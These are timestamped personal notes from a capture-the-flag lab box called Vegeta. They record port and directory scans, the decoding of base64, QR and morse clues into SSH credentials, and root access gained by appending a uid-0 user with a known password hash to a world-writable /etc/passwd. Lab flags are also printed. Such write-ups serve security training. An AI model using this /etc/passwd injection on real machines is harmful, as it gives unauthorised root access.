

```
Lessons Learned:
- new gobuster command
- f12 on every web page, due to finding a base64 encode
- -more code translation
- check history to priv esc.

```

```
17:31
15Feb2023

┌──(root㉿kali)-[/home/kali]
└─# nmap -Pn -sV -sC 192.168.234.73
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-15 22:32 EST
Nmap scan report for 192.168.234.73
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1f3130673f08302e6daee3209ebd6bba (RSA)
|   256 7d8855a86f56c805a47382dcd8db4759 (ECDSA)
|_  256 ccdede4e84a891f51ad6d2a62e9e1ce0 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.90 seconds
                                                                                
┌──(root㉿kali)-[/home/kali]
└─# nmap -Pn -sU -sC 192.168.234.73
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-15 22:33 EST

```


```
17:36
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# dirsearch -u http://192.168.234.73:80 -x 400,401,403

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/192.168.234.73-80/_23-02-15_22-35-28.txt

Error Log: /root/.dirsearch/logs/errors-23-02-15_22-35-28.log

Target: http://192.168.234.73:80/

[22:35:28] Starting: 
[22:35:43] 301 -  316B  - /admin  ->  http://192.168.234.73/admin/
[22:35:43] 200 -  940B  - /admin/
[22:35:43] 200 -  940B  - /admin/?/login
[22:35:43] 200 -    9B  - /admin/admin.php
[22:36:01] 301 -  316B  - /image  ->  http://192.168.234.73/image/
[22:36:01] 301 -  314B  - /img  ->  http://192.168.234.73/img/
[22:36:01] 200 -  119B  - /index.html
[22:36:04] 200 -    0B  - /login.php
[22:36:05] 301 -  317B  - /manual  ->  http://192.168.234.73/manual/ # image 5
[22:36:05] 200 -  626B  - /manual/index.html
[22:36:19] 200 -   11B  - /robots.txt   # image 3 & 4

Task Completed





┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.234.73:80 -k -x txt,php,html -t 250

┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.234.73:80 -k -x txt,php,html -t 250
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.234.73:80
[+] Method:                  GET
[+] Threads:                 250
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
2023/02/15 22:46:16 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 119]
/.html                (Status: 403) [Size: 279]
/img                  (Status: 301) [Size: 314] [--> http://192.168.234.73/img/]
/login.php            (Status: 200) [Size: 0]
/image                (Status: 301) [Size: 316] [--> http://192.168.234.73/image/]
/admin                (Status: 301) [Size: 316] [--> http://192.168.234.73/admin/]
/manual               (Status: 301) [Size: 317] [--> http://192.168.234.73/manual/]
/robots.txt           (Status: 200) [Size: 11]

```

```
17:44
refer to images 3 - 7 for dirsearch screenshots.
```

```
# trying new gobuster because nothing found. - did not work.
18:02
gobuster dir -u http://192.168.234.73:80 -w /usr/share/wordlists/dirbuster/final.txt -s '200,204,301,302,307,403,500' -e
```

```
# needed walkthrough due to not finding anything.
18:18
- had to click f12 to view html inspector to see a base64 encoding under embedded in the Vegeta 1.0 
- http://192.168.234.73/find_me/find_me.html
- refer to image 8

aVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQU1nQUFBRElDQVlBQUFDdFdLNmVBQUFIaGtsRVFWUjRuTzJad1k0c09RZ0U1LzkvK3UyMU5TdTdCd3JTaVN0QzhoR2M0SXBMOTg4L0FGanljem9BZ0RNSUFyQUJRUUEySUFqQUJnUUIySUFnQUJzUUJHQURnZ0JzUUJDQURRZ0NzQUZCQURhRUJmbjUrUmwvbk9aTFAxeER6K3g5VTA1cWJoWjFkcjRzSFQyejkwMDVxYmxaMU5uNXNuVDB6TjQzNWFUbVpsRm41OHZTMFRONzM1U1RtcHRGblowdlMwZlA3SDFUVG1wdUZuVjJ2aXdkUGJQM1RUbXB1Vm5VMmZteWRQVE0zamZscE9hdVhKUVRUamxkSHZ0YmxvNDZOUWp5UjV4eUlvZ09CUGtqVGprUlJBZUMvQkdubkFpaUEwSCtpRk5PQk5HQklIL0VLU2VDNkVDUVArS1VFMEYwakJWRS9aSGM4SEhkUHZ1RWQwZVF3N003MWFtelRIaDNCRGs4dTFPZE9zdUVkMGVRdzdNNzFhbXpUSGgzQkRrOHUxT2RPc3VFZDBlUXc3TTcxYW16VEhoM0JEazh1MU9kT3N1RWQwZVFJcWJNNENUcmhKMGhTQkZUWmtDUUdBaFN4SlFaRUNRR2doUXhaUVlFaVlFZ1JVeVpBVUZpSUVnUlUyWkFrQmdJVXNTVUdSQWtCb0lVMFRHZjAxN2UrdTRJVXNScEtSRGtXYzVsdjNEQlN4ZjFqZE5TSU1pem5NdCs0WUtYTHVvYnA2VkFrR2M1bC8zQ0JTOWQxRGRPUzRFZ3ozSXUrNFVMWHJxb2I1eVdBa0dlNVZ6MkN4ZThkRkhmT0MwRmdqekx1ZXdYTGhCL2VGazZjcm84Mm9rc2IzMTNCQkgwdkNITFc5OGRRUVE5YjhqeTFuZEhFRUhQRzdLODlkMFJSTkR6aGl4dmZYY0VFZlM4SWN0YjN4MUJCRDF2eVBMV2R5OFZaTXJwV1BDYjY2YWNEQWdTbUkrNjJTY0RnZ1RtbzI3MnlZQWdnZm1vbTMweUlFaGdQdXBtbnd3SUVwaVB1dGtuQTRJRTVxTnU5c25nOVNPMkFjcmxQN212SXd2OEg3YjVDd1NCVDlqbUx4QUVQbUdidjBBUStJUnQvZ0pCNEJPMitRc0VnVS9ZNWk4UUJENlIvUS9pMURPTFU4OHBkV3FxY3lKSTBlenFubFBxMUNBSWdveXFVNE1nQ0RLcVRnMkNJTWlvT2pVSWdpQ2o2dFFnQ0lLTXFsTnpYQkExYnhZeWk5TU1UbStVeWwvZXNSZ0VpZU0wZzlNYnBmS1hkeXdHUWVJNHplRDBScW44NVIyTFFaQTRUak00dlZFcWYzbkhZaEFranRNTVRtK1V5bC9lc1JnRWllTTBnOU1icGZLWGR5d0dRZUk0emVEMFJxbjhwYzJTUTcxWkFxZlpwd2pTVWJmc2w2cEtoRU1RajV3SUVzeWZxa3FFUXhDUG5BZ1N6SitxU29SREVJK2NDQkxNbjZwS2hFTVFqNXdJRXN5ZnFrcUVReENQbkFnU3pKK3FTb1JERUkrY0NCTE1uNm9xRHVleWpLNmVhcHdFNmNpWjdabkttS29xRHVleWpLNmVhaEFFUVI3VnFYdXFRUkFFZVZTbjdxa0dRUkRrVVoyNnB4b0VRWkJIZGVxZWFoQUVRUjdWcVh1cVFaQ0JncWcvNWpmZjEvRngzUzdXOHE2cHdia1BRUkNFK3hDa01HZnFycW5CdVE5QkVJVDdFS1F3WitxdXFjRzVEMEVRaFBzUXBEQm42cTdLY0ZtY0hzYnBvM1RLMlpGbEFnaHlPQXVDZUlNZ2g3TWdpRGNJY2pnTGduaURJSWV6SUlnM0NISTRDNEo0Z3lDSHN5Q0lONldDM1A0d1RvL3RKTEo2TDhvc0NGSjBueG9FUVpDMkxCMzNxVUVRQkduTDBuR2ZHZ1JCa0xZc0hmZXBRUkFFYWN2U2NaOGFCRUdRdGl3ZDk2bEJrSUdDZE5TcGUyYnZVMzk0Nm5mb3lPazAzN0pmdU1Ba2VGZlA3SDFPSDE3MlBuVk9wL21XL2NJRkpzRzdlbWJ2Yy9yd3N2ZXBjenJOdCt3WExqQUozdFV6ZTUvVGg1ZTlUNTNUYWI1bHYzQ0JTZkN1bnRuN25ENjg3SDNxbkU3ekxmdUZDMHlDZC9YTTN1ZjA0V1h2VStkMG1tL1pMMXhnRXJ5clovWStwdzh2ZTU4NnA5Tjh5MzdoQXZHSGZzUHlPN0pNMmFkNlp3aGkrbWdkODkyd1R3UzU3RUU3WmtjUUJMbm1RVHRtUnhBRXVlWkJPMlpIRUFTNTVrRTdaa2NRQkxubVFUdG1SNUFYQ1hJNzZnKzJBN1dRSFZrNnhFcmxUMVZkRElKNFpFRVFVeERFSXd1Q21JSWdIbGtReEJRRThjaUNJS1lnaUVjV0JERUZRVHl5akJXa1kyRDFjV0xLQitUeXdYNERRUkFFUVlUM0ljaGhFS1FXQkVFUUJCSGVoeUNIUVpCYUVBUkJFRVI0SDRJY0JrRnFzUmJFaVk2Y04zek1UaCtzK28xUy9VNEg2QUpCRUFSQk5pQUlnaURJQmdSQkVBVFpnQ0FJZ2lBYkVBUkJFR1FEZ2lESUtFRnUrTGc2NW5QSzRuVFV1MTdlRlM0d2VqUjF6bzc1bkxJNEhmV3VsM2VGQzR3ZVRaMnpZejZuTEU1SHZldmxYZUVDbzBkVDUreVl6eW1MMDFIdmVubFh1TURvMGRRNU8rWnp5dUowMUx0ZTNoVXVNSG8wZGM2TytaeXlPQjMxcnBkM2hRdU1IazJkczJNK3B5eE9SNzNyNVYzaEFxTkhVK2QwMnN1VUxOTnpJb2h4M1ExWnB1ZEVFT082RzdKTXo0a2d4blUzWkptZUUwR002MjdJTWowbmdoalgzWkJsZWs0RU1hNjdJY3YwbkFoU3hKUVoxRDJuZkMvTEhKWExjQm9ZUVR4NlR2bGVsamtxbCtFME1JSjQ5Snp5dlN4elZDN0RhV0FFOGVnNTVYdFo1cWhjaHRQQUNPTFJjOHIzc3N4UnVReW5nUkhFbytlVTcyV1pvM0laVGdNamlFZlBLZC9MTWtmbE1weVk4bEVxSC9zSlRoODZnaFNBSUxVZ1NQT2kxQ0JJTFFqU3ZDZzFDRklMZ2pRdlNnMkMxSUlnell0U2d5QzFJRWp6b3RRZ1NDMElVckNvS1NjN245TmVzcHplZmNVTTJmbFMvU29EVERrZEMzYWF3U2tuZ2d3OEhRdDJtc0VwSjRJTVBCMExkcHJCS1NlQ0REd2RDM2Fhd1NrbmdndzhIUXQybXNFcEo0SU1QQjBMZHByQktlZnJCQUY0RXdnQ3NBRkJBRFlnQ01BR0JBSFlnQ0FBR3hBRVlBT0NBR3hBRUlBTkNBS3dBVUVBTmlBSXdBWUVBZGp3SHlVRnd2VnIwS3ZGQUFBQUFFbEZUa1N1UW1DQw== 
```

```
# copied and pasted into a hash analyzer to identify that it is indeed base64
18:29
- refer to image 9
```

```
# used cyberchef to nake from base 64 and from base 64 which spit out a png that was able to be saved
18:33
- reference image 10
```

```
# saved the image as download.png
18:36
- refer to image 11

```
![[11 download.png qr code.png]]


```
# used phone to read qr code
18:38
- refer to image 12
- password: topshellv
```

![[12 qr code password.png]]


```
# tring a gobuster using new seclists to attempt to find a place to put these credentials.
18:43
gobuster -t 100 dir -e -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://192.168.234.73 -x php

# still waiting for results

```

```
# walkthrough shows that gobuster above would find /bulma which has hahahaha.wav in it
19:02
- hahahaha.wav ended up being a morse code file so uploaded to https://morsecode.world/international/decoder/audio-decoder-adaptive.html and decoded the user and password.
- U S E R : T R U N K S P A S S W O R D : U S 3 R <KN> S I N D O L L A R S S Y M B O L )
- refer to image 13
```


![[13 morse code password break.png]]

```
# ssh'd on with creds trunks:u$3r
19:06
trunks@Vegeta:~$ whoami
trunks
trunks@Vegeta:~$ 
```

![[14 trunks whoami.png]]

```
# got local.txt - goijng to try to priv esx
19:09
trunks@Vegeta:~$ ls -la
total 32
drwxr-xr-x 3 trunks trunks 4096 Aug 12  2020 .
drwxr-xr-x 3 root   root   4096 Jun 28  2020 ..
-rw------- 1 trunks trunks  382 Jun 28  2020 .bash_history
-rw-r--r-- 1 trunks trunks  220 Jun 28  2020 .bash_logout
-rw-r--r-- 1 trunks trunks 3526 Jun 28  2020 .bashrc
drwxr-xr-x 3 trunks trunks 4096 Jun 28  2020 .local
-rw-r--r-- 1 trunks trunks   33 Feb 16 09:00 local.txt
-rw-r--r-- 1 trunks trunks  807 Jun 28  2020 .profile
trunks@Vegeta:~$ cat local.txt
0e4eb837a64db3d7da20d1b707f9e10a
```

```
# history shows this user tried to add user to /etc/passwd with a salted password
19:10
trunks@Vegeta:~$ history
    1  perl -le ‘print crypt(“Password@973″,”addedsalt”)’
    2  perl -le 'print crypt("Password@973","addedsalt")'
    3  echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd[/sh]
    4  echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
    5  ls
    6  su Tom
    7  ls -la
    8  cat .bash_history 
    9  sudo apt-get install vim
   10  apt-get install vim
   11  su root
   12  cat .bash_history 
   13  exit
   14  whoami
   15  history
   16  cat /etc/passwd
   17  ls -la
   18  cat local.txt
   19  history
trunks@Vegeta:~$ 

```

```
#ls -la /etc/passwd shows that trunks as the owner has read write access as well as it has root privileges.
19:11
trunks@Vegeta:~$ ls -la /etc/passwd
-rw-r--r-- 1 trunks root 1486 Jun 28  2020 /etc/passwd
```

```
# checking to see if tom is a user in /etc/passwd, he is not.
19:12

trunks@Vegeta:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
trunks:x:1000:1000:trunks,,,:/home/trunks:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin

```

```
# literally used the command found in the history to priv esc as tom who has root privileges.
# su'd to Tom with the salted password from the history.

trunks@Vegeta:~$ ls -la /etc/passwd
-rw-r--r-- 1 trunks root 1486 Jun 28  2020 /etc/passwd
trunks@Vegeta:~$ echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
trunks@Vegeta:~$ su Tom
Password: 
root@Vegeta:/home/trunks# whoami
root
root@Vegeta:/home/trunks# 

- refer to image 15

```

![[15 Tom Privilege Escalation.png]]


```
# root/proof.txt

19:16
root@Vegeta:/home/trunks# cd /root
root@Vegeta:~# ls
proof.txt  root.txt
root@Vegeta:~# cat proof.txt
5e07513231d702b5c83ac928a69a0d22
root@Vegeta:~# cat root.txt
Your flag is in another file...
root@Vegeta:~# 

```

![[16 root and proof.txt.png]]